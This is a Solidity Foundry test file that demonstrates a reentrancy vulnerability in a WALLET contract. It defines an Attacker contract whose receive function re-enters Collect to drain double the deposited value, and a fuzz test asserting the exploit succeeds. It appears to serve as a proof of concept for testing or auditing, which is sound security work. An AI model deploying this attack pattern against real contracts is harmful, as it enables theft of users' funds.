
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET} from "../src/WALLET.sol";
import {Log} from "../src/WALLET.sol";

contract TestReentrancyWALLET is Test {
    WALLET public _wallet;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _wallet = new WALLET(address(_log));
        _attacker = new Attacker(address(_wallet));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);

        vm.deal(address(_wallet), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        
        vm.warp(block.timestamp + 1000);
        
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        victim.Put{value: val * 2}(block.timestamp - 100);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(victim).balance;
        
        victim.Collect(val);
        
        if (address(victim).balance == initialSnapshot - (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }
}
